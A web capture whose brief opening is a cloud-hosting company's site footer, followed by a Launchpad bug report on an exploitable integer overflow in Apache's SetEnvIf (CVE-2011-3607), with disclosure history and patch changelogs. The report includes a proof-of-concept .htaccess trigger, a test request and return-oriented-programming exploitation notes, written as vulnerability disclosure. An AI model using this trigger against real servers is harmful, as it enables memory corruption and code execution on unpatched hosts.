[April 3, 2024
### Carbon60 Named a VMware Cloud Service Provider Pinnacle Tier Partner in the Broadcom Advantage Partner Program](https://www.carbon60.com/blog/managed-hosting/vmware-cloud-service-provider-pinnacle-tier-partner)

[March 8, 2024
### Elevating Women in Tech: Insights from OpsGuru’s Mency Woo](https://www.carbon60.com/blog/mency-woo-women-in-tech)

## Talk to a Cloud Managed Services Expert

Contact us to learn how Carbon60 can help you manage your cloud infrastructure with confidence.

Name\*

Company Name

Email Address\*

Phone Number

Your comments

Please leave this field empty.

[![Carbon60](data:image/gif;base64...)![Carbon60](https://www.carbon60.com/wp-content/themes/monochrome-pro/images/carbon60-logo-tagline-white.svg)](https://www.carbon60.com/)

* [Managed Private Cloud](https://www.carbon60.com/managed-infrastructure/managed-private-cloud)
  + [Managed Hosting](https://www.carbon60.com/managed-infrastructure/managed-private-cloud/managed-hosting)
  + [Dedicated Private Cloud](https://www.carbon60.com/managed-infrastructure/dedicated-private-cloud)
  + [Edge Cloud](https://www.carbon60.com/managed-infrastructure/edge-computing)
  + [Backup](https://www.carbon60.com/managed-infrastructure/managed-private-cloud/backup)
  + [Microsoft 365 Backup](/managed-cloud/cloud-backup#M365backup)
  + [DR](https://www.carbon60.com/cloud-disaster-recovery)
* [Managed Public Cloud](https://www.carbon60.com/managed-public-cloud)
  + [Azure Managed Operations](https://www.carbon60.com/managed-infrastructure/azure-managed-operations)
  + [AWS Managed Operations](https://www.carbon60.com/managed-infrastructure/aws-managed-operations)
  + [VMware on AWS](https://www.carbon60.com/managed-public-cloud/vmware-aws)
  + [Azure Virtual Desktop](https://www.carbon60.com/managed-infrastructure/azure-virtual-desktop)
  + [Microsoft 365](https://www.carbon60.com/managed-public-cloud/microsoft-365)
* [Industries](https://www.carbon60.com/industries)
  + [Financial Services](https://www.carbon60.com/industries/finance)
  + [Healthcare](https://www.carbon60.com/industries/healthcare)
  + [Public Sector](https://www.carbon60.com/industries/public-sector)
  + [Technology](https://www.carbon60.com/industries/technology)
* [Migration Services](https://www.carbon60.com/migration-services)
  + [Cloud Assessment](https://www.carbon60.com/professional-services/cloud-assessment)
  + [Cloud Migration](https://www.carbon60.com/migration-services/cloud-migration)
  + [Cloud Advisory](https://www.carbon60.com/professional-services/cloud-advisory)

[![Follow us on LinkedIn](data:image/gif;base64...)![Follow us on LinkedIn](/wp-content/uploads/2021/07/icons8-linkedin.svg)](https://www.linkedin.com/company/carbon60-networks)
[![Follow us on YouTube](data:image/gif;base64...)![Follow us on YouTube](/wp-content/uploads/2021/09/2986210_media_social_youtube_icon.svg)](https://www.youtube.com/channel/UCXEzwtK3JHOmhjdlGOv-5rQ)
[![Follow us on YouTube](data:image/gif;base64...)![Follow us on YouTube](/wp-content/uploads/2023/05/media_social_opsguru_icon-1.svg)](https://opsguru.io/)

© Copyright Carbon60 2025

* [Privacy Policy](/privacy-policy)
* [Terms & Conditions](https://www.carbon60.com/terms-conditions)
* [Sustainability](https://www.carbon60.com/c60-sustainability)
* [Contact Us](https://www.carbon60.com/contact-us)



=== Content from bugs.launchpad.net_b8ba7a75_20250126_073924.html ===

[Log in / Register](https://bugs.launchpad.net/ubuntu/%2Bsource/apache2/%2Bbug/811422/%2Blogin)

[![](https://launchpadlibrarian.net/606381979/CoF%2064px.png)](https://launchpad.net/ubuntu)

## [Ubuntu](https://launchpad.net/ubuntu)[apache2 package](https://launchpad.net/ubuntu/%2Bsource/apache2)

* [Overview](https://launchpad.net/ubuntu/%2Bsource/apache2)
* [Code](https://code.launchpad.net/ubuntu/%2Bsource/apache2)
* [Bugs](https://bugs.launchpad.net/ubuntu/%2Bsource/apache2)
* Blueprints
* [Translations](https://translations.launchpad.net/ubuntu/%2Bsource/apache2)
* [Answers](https://answers.launchpad.net/ubuntu/%2Bsource/apache2)

# Exploitable integer overflow on x86 in mod SetEnvIf, leading to buffer overwrite

Bug #811422 reported by
[halfdog](https://launchpad.net/~halfdog)
on 2011-07-16

[260](/%2Bhelp-bugs/bug-heat.html)

This bug affects 1 person

| Affects | | Status | Importance | Assigned to | Milestone |
| --- | --- | --- | --- | --- | --- |
|  | [apache2 (Ubuntu)](https://bugs.launchpad.net/ubuntu/%2Bsource/apache2 "Latest release: 2.4.52-1ubuntu4.13, uploaded to main on 2024-10-03 13:21:17.194414+00:00 by Athos Ribeiro (athos-ribeiro), maintained by Ubuntu Developers (ubuntu-devel-discuss-lists)") | Fix Released | Low | Unassigned |  |
|  | [Hardy](https://bugs.launchpad.net/ubuntu/hardy/%2Bsource/apache2) | Fix Released | Low | [Marc Deslauriers](https://launchpad.net/~mdeslaur) |  |
|  | [Lucid](https://bugs.launchpad.net/ubuntu/lucid/%2Bsource/apache2) | Fix Released | Low | [Marc Deslauriers](https://launchpad.net/~mdeslaur) |  |
|  | [Maverick](https://bugs.launchpad.net/ubuntu/maverick/%2Bsource/apache2) | Fix Released | Low | [Marc Deslauriers](https://launchpad.net/~mdeslaur) |  |
|  | [Natty](https://bugs.launchpad.net/ubuntu/natty/%2Bsource/apache2) | Fix Released | Low | [Marc Deslauriers](https://launchpad.net/~mdeslaur) |  |
|  | [Oneiric](https://bugs.launchpad.net/ubuntu/oneiric/%2Bsource/apache2) | Fix Released | Low | [Marc Deslauriers](https://launchpad.net/~mdeslaur) |  |
|  | [Precise](https://bugs.launchpad.net/ubuntu/precise/%2Bsource/apache2) | Fix Released | Low | Unassigned |  |

### Bug Description

Apache worker on oneric, in server/util.c, function

AP\_DECLARE(char \*) ap\_pregsub(apr\_pool\_t \*p, const char \*input,

                              const char \*source, size\_t nmatch,

                              ap\_regmatch\_t pmatch[])

contains exploitable integer overflow when calculating length of

buffer:

else if (no < nmatch && pmatch[no].rm\_so < pmatch[no].rm\_eo) {

            len += pmatch[no].rm\_eo - pmatch[no].rm\_so;

        }

...

dest = dst = apr\_pcalloc(p, len + 1);

Can be triggered by placing .htaccess file on server with module

enabled:

SetEnvIf MyRequest "^(.\*)$"

TestVar=$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$10123456789abcde

SetEnvIf TestVar "^(.\*)$"

Test2Var=$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$10123456789abcdef0123456789abcdef0123456789abc

SetEnvIf Test2Var "^(.\*)$"

Test3Var=$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1

SetEnvIf Test3Var "^(.\*)$"

Test4Var=S$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1

Testrequest:

GET /test/file HTTP/1.1

Host: localhost

MyRequest: 0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF

Connection: close

Result: Allocates 2^6 \* 2^6 \* 2^6 \* 2^6 \* 2^8 + 1 = 2^32 + 1 bytes via

apr\_pcalloc

Add some slack using "0123456789abcde" at end of expression to select if

else if (no < nmatch && pmatch[no].rm\_so < pmatch[no].rm\_eo) {

            len = pmatch[no].rm\_eo - pmatch[no].rm\_so;

            memcpy(dst, source + pmatch[no].rm\_so, len);

            dst += len;

        }

or while-loop around memcpy should segfault, usually at

        if (no > 9) { /\* Ordinary character. \*/

            if (c == '\\' && (\*src == '$' || \*src == '&'))

                c = \*src++;

            \*dst++ = c;

        }

Ubuntu security was informed 20110715, no reply so far. When .htaccess was placed on server, exploitation seems to be possible on nonexec segments using 2 concurrent client requests over net. With return-oriented-programming with 3 blocks from (xchg eax/esp+ret; pop eax+ret, pop ebx,ecx,edx+ret; cd 0x80) should do the trick, but currently stability is not good enough. The main target to control IP is

0 0x002cb36b in apr\_brigade\_cleanup () from /usr/lib/libaprutil-2.so.0

esi 0x46464646 1179010629

   0x002cb350 <+0>: push %ebp

   0x002cb351 <+1>: push %edi

   0x002cb352 <+2>: push %esi

   0x002cb353 <+3>: sub $0x10,%esp

   0x002cb356 <+6>: mov 0x20(%esp),%edi

   0x002cb35a <+10>: mov 0x4(%edi),%eax

   0x002cb35d <+13>: lea 0x4(%edi),%ebp

   0x002cb360 <+16>: cmp %ebp,%eax

   0x002cb362 <+18>: je 0x2cb393 <apr\_brigade\_cleanup+67>

   0x002cb364 <+20>: lea 0x0(%esi,%eiz,1),%esi

   0x002cb368 <+24>: mov 0x4(%edi),%esi -- user controlable

=> 0x002cb36b <+27>: mov 0x4(%esi),%eax

   0x002cb36e <+30>: mov (%esi),%edx

   0x002cb370 <+32>: mov %edx,(%eax) -- (esi) to (esi+4)

   0x002cb372 <+34>: mov (%esi),%eax

   0x002cb374 <+36>: mov 0x4(%esi),%edx

   0x002cb377 <+39>: mov %edx,0x4(%eax) -- (esi+4) to ((esi)+4)

   0x002cb37a <+42>: mov 0x8(%esi),%eax

   0x002cb37d <+45>: mov 0x18(%esi),%edx -- 0x18 value to stack

   0x002cb380 <+48>: mov %edx,(%esp)

   0x002cb383 <+51>: call \*0xc(%eax)

where esi is user controllable and can be made pointing to other user-data blocks. The symlink attack from

<http://www.halfdog.net/Security/2011/ApacheNoFollowSymlinkTimerace/> (issue number coming soon) might be useful to get apache memory layout from /proc/<pid>/maps, a issue to suspend httpd when serving pipes ([https://bugs.launchpad.net/ubuntu/+source/apache2/+bug/811417](https://bugs.launchpad.net/ubuntu/%2Bsource/apache2/%2Bbug/811417)) might be helpful with timing attack, but this not yet proofed.

# lsb\_release -rd

Description: Ubuntu oneiric (development branch)

Release: 11.10

# apt-cache policy apache2-mpm-worker

apache2-mpm-worker:

  Installed: 2.2.19-1ubuntu1

  Candidate: 2.2.19-1ubuntu1

  Version table:

 \*\*\* 2.2.19-1ubuntu1 0

        500 <http://archive.ubuntu.com/ubuntu/> oneiric/main i386 Packages

        100 /var/lib/dpkg/status

## Related branches

[lp:ubuntu/hardy-security/apache2](https://code.launchpad.net/~ubuntu-branches/ubuntu/hardy/apache2/hardy-security)

[lp:ubuntu/oneiric-security/apache2](https://code.launchpad.net/~ubuntu-branches/ubuntu/oneiric/apache2/oneiric-security)

[lp:ubuntu/maverick-security/apache2](https://code.launchpad.net/~ubuntu-branches/ubuntu/maverick/apache2/maverick-security)

[lp:ubuntu/lucid-security/apache2](https://code.launchpad.net/~ubuntu-branches/ubuntu/lucid/apache2/lucid-security)

[lp:ubuntu/natty-security/apache2](https://code.launchpad.net/~ubuntu-branches/ubuntu/natty/apache2/natty-security)

[lp:ubuntu/hardy-updates/apache2](https://code.launchpad.net/~ubuntu-branches/ubuntu/hardy/apache2/hardy-updates)

[lp:ubuntu/lucid-updates/apache2](https://code.launchpad.net/~ubuntu-branches/ubuntu/lucid/apache2/lucid-updates)

## CVE References

* [2011-3607](/bugs/cve/2011-3607 "Integer overflow in the ap_pregsub fu...")
* [2011-4317](/bugs/cve/2011-4317 "The mod_proxy module in the Apache HT...")
* [2011-4415](/bugs/cve/2011-4415 "The ap_pregsub function in server/uti...")
* [2012-0021](/bugs/cve/2012-0021 "The log_cookie function in mod_log_co...")
* [2012-0031](/bugs/cve/2012-0031 "scoreboard.c in the Apache HTTP Serve...")
* [2012-0053](/bugs/cve/2012-0053 "protocol.c in the Apache HTTP Server ...")

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [halfdog (halfdog)](https://launchpad.net/~halfdog) wrote on 2011-07-16: |  |  | [#1](/ubuntu/%2Bsource/apache2/%2Bbug/811422/comments/1) |
| --- | --- | --- | --- |

Read proc/<pid>/maps due to timerace [https://bugs.launchpad.net/ubuntu/+source/apache2/+bug/811428](https://bugs.launchpad.net/ubuntu/%2Bsource/apache2/%2Bbug/811428) . Since attacker must have been able to place .htaccess on server, he might be able to place a symlink also.

Read proc/<pid>/maps due to timerace https://bugs.launchpad.net/ubuntu/+source/apache2/+bug/811428 . Since attacker must have been able to place .htaccess on server, he might be able to place a symlink also.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Marc Deslauriers (mdeslaur)](https://launchpad.net/~mdeslaur) wrote on 2011-08-01: |  |  | [#2](/ubuntu/%2Bsource/apache2/%2Bbug/811422/comments/2) |
| --- | --- | --- | --- |

Thanks for reporting this issue.

Could you please report this issue to the Apache Security Team, and possibly link the resulting bug report here.

Thanks.

Thanks for reporting this issue.
Could you please report this issue to the Apache Security Team, and possibly link the resulting bug report here.
Thanks.

| Changed in apache2 (Ubuntu): | |
| --- | --- |
| **importance**: | Undecided → Low |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Marc Deslauriers (mdeslaur)](https://launchpad.net/~mdeslaur) wrote on 2011-08-01: |  |  | [#3](/ubuntu/%2Bsource/apache2/%2Bbug/811422/comments/3) |
| --- | --- | --- | --- |

See here for information on reporting this issue:

<http://www.apache.org/security/>

See here for information on reporting this issue:
http://www.apache.org/security/

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Jamie Strandboge (jdstrand)](https://launchpad.net/~jdstrand) wrote on 2011-08-26: |  |  | [#4](/ubuntu/%2Bsource/apache2/%2Bbug/811422/comments/4) |
| --- | --- | --- | --- |

What was the response from upstream?

What was the response from upstream?

| Changed in apache2 (Ubuntu): | |
| --- | --- |
| **assignee**: | nobody → Jamie Strandboge (jdstrand) |
| **status**: | New → Incomplete |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [halfdog (halfdog)](https://launchpad.net/~halfdog) wrote on 2011-10-04: |  |  | [#5](/ubuntu/%2Bsource/apache2/%2Bbug/811422/comments/5) |
| --- | --- | --- | --- |

Sent mail to <email address hidden> 2011-07-15 (no reply) and again today:

Dear Apache Httpd Security Team,

It seems possible to execute arbitrary via the bug reported

2011-07-15. Since this requires a crafted .htaccess file on the host,

this might not be a too big issue.

See

<http://www.halfdog.net/Security/2011/ApacheModSetEnvIfIntegerOverflow/>

for first draft of multi-thread exploit (url not published elsewhere).

Currently I'm trying to get more stable code executing using the

stop-regex approach and just a single thread.

I checked the reporting guidelines again today and found, that there is a different security contact mail address mentioned. I'm not sure, if something has changed at apache website or I just picked up an dead address. Resending to <email address hidden>

Sent mail to security@httpd.apache.org 2011-07-15 (no reply) and again today:
Dear Apache Httpd Security Team,
It seems possible to execute arbitrary via the bug reported
2011-07-15. Since this requires a crafted .htaccess file on the host,
this might not be a too big issue.
See
http://www.halfdog.net/Security/2011/ApacheModSetEnvIfIntegerOverflow/
for first draft of multi-thread exploit (url not published elsewhere).
Currently I'm trying to get more stable code executing using the
stop-regex approach and just a single thread.
I checked the reporting guidelines again today and found, that there is a different security contact mail address mentioned. I'm not sure, if something has changed at apache website or I just picked up an dead address. Resending to security@apache.org

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [halfdog (halfdog)](https://launchpad.net/~halfdog) wrote on 2011-10-27: |  |  | [#6](/ubuntu/%2Bsource/apache2/%2Bbug/811422/comments/6) |
| --- | --- | --- | --- |

Got reply from apache-security, request to create advisory.

Updated bug information, placed a advisory-stub at <http://www.halfdog.net/Security/2011/ApacheModSetEnvIfIntegerOverflow/> , sent update to apache.

Got reply from apache-security, request to create advisory.
Updated bug information, placed a advisory-stub at http://www.halfdog.net/Security/2011/ApacheModSetEnvIfIntegerOverflow/ , sent update to apache.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [halfdog (halfdog)](https://launchpad.net/~halfdog) wrote on 2011-11-04: |  |  | [#7](/ubuntu/%2Bsource/apache2/%2Bbug/811422/comments/7) |
| --- | --- | --- | --- |

Information Joe Orton:

We'd prefer to discuss the appropriate fix for this on the public

mailing list, so could you publish your advisory as soon as is

convenient. We'll follow up with public discussion and patches as

appropriate.

Please use the CVE name CVE-2011-3607 for this issue.

Very good discussion:

<http://www.gossamer-threads.com/lists/apache/dev/403775>

Information Joe Orton:
We'd prefer to discuss the appropriate fix for this on the public
mailing list, so could you publish your advisory as soon as is
convenient. We'll follow up with public discussion and patches as
appropriate.
Please use the CVE name CVE-2011-3607 for this issue.
Very good discussion:
http://www.gossamer-threads.com/lists/apache/dev/403775

| **visibility**: | private → public |
| --- | --- |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [halfdog (halfdog)](https://launchpad.net/~halfdog) wrote on 2011-11-09: |  |  | [#8](/ubuntu/%2Bsource/apache2/%2Bbug/811422/comments/8) |
| --- | --- | --- | --- |

CVE-2011-3607 is fixed upstream in trunk, but not yet released: <http://svn.apache.org/viewvc?view=revision&revision=1198940>

Another CVE-2011-4415 was assigned by mitre to the resource consumption, NULL-dereference issue

CVE-2011-3607 is fixed upstream in trunk, but not yet released: http://svn.apache.org/viewvc?view=revision&revision=1198940
Another CVE-2011-4415 was assigned by mitre to the resource consumption, NULL-dereference issue

[Marc Deslauriers (mdeslaur)](https://launchpad.net/~mdeslaur)
on 2012-02-14

| Changed in apache2 (Ubuntu Hardy): | |
| --- | --- |
| **status**: | New → Confirmed |
| Changed in apache2 (Ubuntu Lucid): | |
| **status**: | New → Confirmed |
| Changed in apache2 (Ubuntu Maverick): | |
| **status**: | New → Confirmed |
| Changed in apache2 (Ubuntu Natty): | |
| **status**: | New → Confirmed |
| Changed in apache2 (Ubuntu Oneiric): | |
| **status**: | New → Confirmed |
| Changed in apache2 (Ubuntu Precise): | |
| **status**: | Incomplete → Fix Released |
| **assignee**: | Jamie Strandboge (jdstrand) → nobody |
| Changed in apache2 (Ubuntu Hardy): | |
| **assignee**: | nobody → Marc Deslauriers (mdeslaur) |
| Changed in apache2 (Ubuntu Lucid): | |
| **assignee**: | nobody → Marc Deslauriers (mdeslaur) |
| Changed in apache2 (Ubuntu Maverick): | |
| **assignee**: | nobody → Marc Deslauriers (mdeslaur) |
| Changed in apache2 (Ubuntu Oneiric): | |
| **assignee**: | nobody → Marc Deslauriers (mdeslaur) |
| Changed in apache2 (Ubuntu Natty): | |
| **assignee**: | nobody → Marc Deslauriers (mdeslaur) |
| Changed in apache2 (Ubuntu Hardy): | |
| **importance**: | Undecided → Low |
| Changed in apache2 (Ubuntu Lucid): | |
| **importance**: | Undecided → Low |
| Changed in apache2 (Ubuntu Maverick): | |
| **importance**: | Undecided → Low |
| Changed in apache2 (Ubuntu Oneiric): | |
| **importance**: | Undecided → Low |
| Changed in apache2 (Ubuntu Natty): | |
| **importance**: | Undecided → Low |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Launchpad Janitor (janitor)](https://launchpad.net/~janitor) wrote on 2012-02-16: |  |  | [#9](/ubuntu/%2Bsource/apache2/%2Bbug/811422/comments/9) |
| --- | --- | --- | --- |

This bug was fixed in the package apache2 - 2.2.20-1ubuntu1.2

---------------

apache2 (2.2.20-1ubuntu1.2) oneiric-security; urgency=low

\* SECURITY UPDATE: arbitrary code execution via crafted SetEnvIf

    directive (LP: [#811422](/bugs/811422))

    - debian/patches/215\_CVE-2011-3607.dpatch: validate length in

      server/util.c.

    - CVE-2011-3607

  \* SECURITY UPDATE: another mod\_proxy reverse proxy exposure

    - debian/patches/216\_CVE-2011-4317.dpatch: validate additional URIs in

      modules/mappers/mod\_rewrite.c, modules/proxy/mod\_proxy.c,

      server/protocol.c.

    - CVE-2011-4317

  \* SECURITY UPDATE: denial of service via invalid cookie

    - debian/patches/217\_CVE-2012-0021.dpatch: check name and value in

      modules/loggers/mod\_log\_config.c.

    - CVE-2012-0021

  \* SECURITY UPDATE: denial of service and possible code execution via

    type field modification within a scoreboard shared memory segment

    - debian/patches/218\_CVE-2012-0031.dpatch: check type field in

      server/scoreboard.c.

    - CVE-2012-0031

  \* SECURITY UPDATE: cookie disclosure via Bad Request errors

    - debian/patches/219\_CVE-2012-0053.dpatch: check lengths in

      server/protocol.c.

    - CVE-2012-0053

 -- Marc Deslauriers <email address hidden> Tue, 14 Feb 2012 09:35:36 -0500

This bug was fixed in the package apache2 - 2.2.20-1ubuntu1.2
---------------
apache2 (2.2.20-1ubuntu1.2) oneiric-security; urgency=low
\* SECURITY UPDATE: arbitrary code execution via crafted SetEnvIf
directive (LP: #811422)
- debian/patches/215\_CVE-2011-3607.dpatch: validate length in
server/util.c.
- CVE-2011-3607
\* SECURITY UPDATE: another mod\_proxy reverse proxy exposure
- debian/patches/216\_CVE-2011-4317.dpatch: validate additional URIs in
modules/mappers/mod\_rewrite.c, modules/proxy/mod\_proxy.c,
server/protocol.c.
- CVE-2011-4317
\* SECURITY UPDATE: denial of service via invalid cookie
- debian/patches/217\_CVE-2012-0021.dpatch: check name and value in
modules/loggers/mod\_log\_config.c.
- CVE-2012-0021
\* SECURITY UPDATE: denial of service and possible code execution via
type field modification within a scoreboard shared memory segment
- debian/patches/218\_CVE-2012-0031.dpatch: check type field in
server/scoreboard.c.
- CVE-2012-0031
\* SECURITY UPDATE: cookie disclosure via Bad Request errors
- debian/patches/219\_CVE-2012-0053.dpatch: check lengths in
server/protocol.c.
- CVE-2012-0053
-- Marc Deslauriers <marc.deslauriers@ubuntu.com> Tue, 14 Feb 2012 09:35:36 -0500

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Launchpad Janitor (janitor)](https://launchpad.net/~janitor) wrote on 2012-02-16: |  |  | [#10](/ubuntu/%2Bsource/apache2/%2Bbug/811422/comments/10) |
| --- | --- | --- | --- |

This bug was fixed in the package apache2 - 2.2.17-1ubuntu1.5

---------------

apache2 (2.2.17-1ubuntu1.5) natty-security; urgency=low

\* SECURITY UPDATE: arbitrary code execution via crafted SetEnvIf

    directive (LP: [#811422](/bugs/811422))

    - debian/patches/215\_CVE-2011-3607.dpatch: validate length in

      server/util.c.

    - CVE-2011-3607

  \* SECURITY UPDATE: another mod\_proxy reverse proxy exposure

    - debian/patches/216\_CVE-2011-4317.dpatch: validate additional URIs in

      modules/mappers/mod\_rewrite.c, modules/proxy/mod\_proxy.c,

      server/protocol.c.

    - CVE-2011-4317

  \* SECURITY UPDATE: denial of service via invalid cookie

    - debian/patches/217\_CVE-2012-0021.dpatch: check name and value in

      modules/loggers/mod\_log\_config.c.

    - CVE-2012-0021

  \* SECURITY UPDATE: denial of service and possible code execution via

    type field modification within a scoreboard shared memory segment

    - debian/patches/218\_CVE-2012-0031.dpatch: check type field in

      server/scoreboard.c.

    - CVE-2012-0031

  \* SECURITY UPDATE: cookie disclosure via Bad Request errors

    - debian/patches/219\_CVE-2012-0053.dpatch: check lengths in

      server/protocol.c.

    - CVE-2012-0053

 -- Marc Deslauriers <email address hidden> Tue, 14 Feb 2012 10:02:26 -0500

This bug was fixed in the package apache2 - 2.2.17-1ubuntu1.5
---------------
apache2 (2.2.17-1ubuntu1.5) natty-security; urgency=low
\* SECURITY UPDATE: arbitrary code execution via crafted SetEnvIf
directive (LP: #811422)
- debian/patches/215\_CVE-2011-3607.dpatch: validate length in
server/util.c.
- CVE-2011-3607
\* SECURITY UPDATE: another mod\_proxy reverse proxy exposure
- debian/patches/216\_CVE-2011-4317.dpatch: validate additional URIs in
modules/mappers/mod\_rewrite.c, modules/proxy/mod\_proxy.c,
server/protocol.c.
- CVE-2011-4317
\* SECURITY UPDATE: denial of service via invalid cookie
- debian/patches/217\_CVE-2012-0021.dpatch: check name and value in
modules/loggers/mod\_log\_config.c.
- CVE-2012-0021
\* SECURITY UPDATE: denial of service and possible code execution via
type field modification within a scoreboard shared memory segment
- debian/patches/218\_CVE-2012-0031.dpatch: check type field in
server/scoreboard.c.
- CVE-2012-0031
\* SECURITY UPDATE: cookie disclosure via Bad Request errors
- debian/patches/219\_CVE-2012-0053.dpatch: check lengths in
server/protocol.c.
- CVE-2012-0053
-- Marc Deslauriers <marc.deslauriers@ubuntu.com> Tue, 14 Feb 2012 10:02:26 -0500

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Launchpad Janitor (janitor)](https://launchpad.net/~janitor) wrote on 2012-02-16: |  |  | [#11](/ubuntu/%2Bsource/apache2/%2Bbug/811422/comments/11) |
| --- | --- | --- | --- |

This bug was fixed in the package apache2 - 2.2.16-1ubuntu3.5

---------------

apache2 (2.2.16-1ubuntu3.5) maverick-security; urgency=low

\* SECURITY UPDATE: arbitrary code execution via crafted SetEnvIf

    directive (LP: [#811422](/bugs/811422))

    - debian/patches/215\_CVE-2011-3607.dpatch: validate length in

      server/util.c.

    - CVE-2011-3607

  \* SECURITY UPDATE: another mod\_proxy reverse proxy exposure

    - debian/patches/216\_CVE-2011-4317.dpatch: validate additional URIs in

      modules/mappers/mod\_rewrite.c, modules/proxy/mod\_proxy.c,

      server/protocol.c.

    - CVE-2011-4317

  \* SECURITY UPDATE: denial of service and possible code execution via

    type field modification within a scoreboard shared memory segment

    - debian/patches/218\_CVE-2012-0031.dpatch: check type field in

      server/scoreboard.c.

    - CVE-2012-0031

  \* SECURITY UPDATE: cookie disclosure via Bad Request errors

    - debian/patches/219\_CVE-2012-0053.dpatch: check lengths in

      server/protocol.c.

    - CVE-2012-0053

 -- Marc Deslauriers <email address hidden> Tue, 14 Feb 2012 10:11:29 -0500

This bug was fixed in the package apache2 - 2.2.16-1ubuntu3.5
---------------
apache2 (2.2.16-1ubuntu3.5) maverick-security; urgency=low
\* SECURITY UPDATE: arbitrary code execution via crafted SetEnvIf
directive (LP: #811422)
- debian/patches/215\_CVE-2011-3607.dpatch: validate length in
server/util.c.
- CVE-2011-3607
\* SECURITY UPDATE: another mod\_proxy reverse proxy exposure
- debian/patches/216\_CVE-2011-4317.dpatch: validate additional URIs in
modules/mappers/mod\_rewrite.c, modules/proxy/mod\_proxy.c,
server/protocol.c.
- CVE-2011-4317
\* SECURITY UPDATE: denial of service and possible code execution via
type field modification within a scoreboard shared memory segment
- debian/patches/218\_CVE-2012-0031.dpatch: check type field in
server/scoreboard.c.
- CVE-2012-0031
\* SECURITY UPDATE: cookie disclosure via Bad Request errors
- debian/patches/219\_CVE-2012-0053.dpatch: check lengths in
server/protocol.c.
- CVE-2012-0053
-- Marc Deslauriers <marc.deslauriers@ubuntu.com> Tue, 14 Feb 2012 10:11:29 -0500

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Launchpad Janitor (janitor)](https://launchpad.net/~janitor) wrote on 2012-02-16: |  |  | [#12](/ubuntu/%2Bsource/apache2/%2Bbug/811422/comments/12) |
| --- | --- | --- | --- |

This bug was fixed in the package apache2 - 2.2.14-5ubuntu8.8

---------------

apache2 (2.2.14-5ubuntu8.8) lucid-security; urgency=low

\* SECURITY UPDATE: arbitrary code execution via crafted SetEnvIf

    directive (LP: [#811422](/bugs/811422))

    - debian/patches/215\_CVE-2011-3607.dpatch: validate length in

      server/util.c.

    - CVE-2011-3607

  \* SECURITY UPDATE: another mod\_proxy reverse proxy exposure

    - debian/patches/216\_CVE-2011-4317.dpatch: validate additional URIs in

      modules/mappers/mod\_rewrite.c, modules/proxy/mod\_proxy.c,

      server/protocol.c.

    - CVE-2011-4317

  \* SECURITY UPDATE: denial of service and possible code execution via

    type field modification within a scoreboard shared memory segment

    - debian/patches/218\_CVE-2012-0031.dpatch: check type field in

      server/scoreboard.c.

    - CVE-2012-0031

  \* SECURITY UPDATE: cookie disclosure via Bad Request errors

    - debian/patches/219\_CVE-2012-0053.dpatch: check lengths in

      server/protocol.c.

    - CVE-2012-0053

 -- Marc Deslauriers <email address hidden> Tue, 14 Feb 2012 10:36:43 -0500

This bug was fixed in the package apache2 - 2.2.14-5ubuntu8.8
---------------
apache2 (2.2.14-5ubuntu8.8) lucid-security; urgency=low
\* SECURITY UPDATE: arbitrary code execution via crafted SetEnvIf
directive (LP: #811422)
- debian/patches/215\_CVE-2011-3607.dpatch: validate length in
server/util.c.
- CVE-2011-3607
\* SECURITY UPDATE: another mod\_proxy reverse proxy exposure
- debian/patches/216\_CVE-2011-4317.dpatch: validate additional URIs in
modules/mappers/mod\_rewrite.c, modules/proxy/mod\_proxy.c,
server/protocol.c.
- CVE-2011-4317
\* SECURITY UPDATE: denial of service and possible code execution via
type field modification within a scoreboard shared memory segment
- debian/patches/218\_CVE-2012-0031.dpatch: check type field in
server/scoreboard.c.
- CVE-2012-0031
\* SECURITY UPDATE: cookie disclosure via Bad Request errors
- debian/patches/219\_CVE-2012-0053.dpatch: check lengths in
server/protocol.c.
- CVE-2012-0053
-- Marc Deslauriers <marc.deslauriers@ubuntu.com> Tue, 14 Feb 2012 10:36:43 -0500

Revision history for this message
